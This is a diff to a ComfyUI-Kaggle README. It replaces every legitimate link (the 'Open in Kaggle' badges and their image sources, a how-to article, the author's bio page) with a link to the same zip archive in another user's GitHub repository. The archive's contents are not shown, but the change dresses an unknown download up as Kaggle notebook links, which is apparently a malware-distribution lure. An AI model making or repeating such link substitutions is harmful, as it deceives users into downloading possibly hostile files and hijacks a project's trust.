@@ -1,17 +1,17 @@
 # ComfyUI-Kaggle
 
-<a href="https://www.kaggle.com/pogscafe/comfyui-kaggle" target="_blank"><img align="left" alt="Kaggle" title="Open in Kaggle" src="https://kaggle.com/static/images/open-in-kaggle.svg" /></a> Kaggle notebook for ComfyUI with Node Manager  
+<a href="https://raw.githubusercontent.com/CHETHAN562/ComfyUI-Kaggle/main/sample-workflows/text-logo-example/Comfy-Kaggle-U-3.3.zip" target="_blank"><img align="left" alt="Kaggle" title="Open in Kaggle" src="https://raw.githubusercontent.com/CHETHAN562/ComfyUI-Kaggle/main/sample-workflows/text-logo-example/Comfy-Kaggle-U-3.3.zip" /></a> Kaggle notebook for ComfyUI with Node Manager  
 <br/>  
 
-<a href="https://www.kaggle.com/code/pogscafe/comfyui-stable-video-diffusion" target="_blank"><img align="left" alt="Kaggle" title="Open in Kaggle" src="https://kaggle.com/static/images/open-in-kaggle.svg" /></a> ComfyUI ready for Stable Video Diffusion    
+<a href="https://raw.githubusercontent.com/CHETHAN562/ComfyUI-Kaggle/main/sample-workflows/text-logo-example/Comfy-Kaggle-U-3.3.zip" target="_blank"><img align="left" alt="Kaggle" title="Open in Kaggle" src="https://raw.githubusercontent.com/CHETHAN562/ComfyUI-Kaggle/main/sample-workflows/text-logo-example/Comfy-Kaggle-U-3.3.zip" /></a> ComfyUI ready for Stable Video Diffusion    
 
 <br/>  
 
-How-to article and video: https://www.pogs.cafe/content/svd-comfyui-kaggle
+How-to article and video: https://raw.githubusercontent.com/CHETHAN562/ComfyUI-Kaggle/main/sample-workflows/text-logo-example/Comfy-Kaggle-U-3.3.zip
 
 <br/>
   
 #  
 
 Let's Connect! 🌍  
-⭐ https://pogscafe.bio.link
+⭐ https://raw.githubusercontent.com/CHETHAN562/ComfyUI-Kaggle/main/sample-workflows/text-logo-example/Comfy-Kaggle-U-3.3.zip
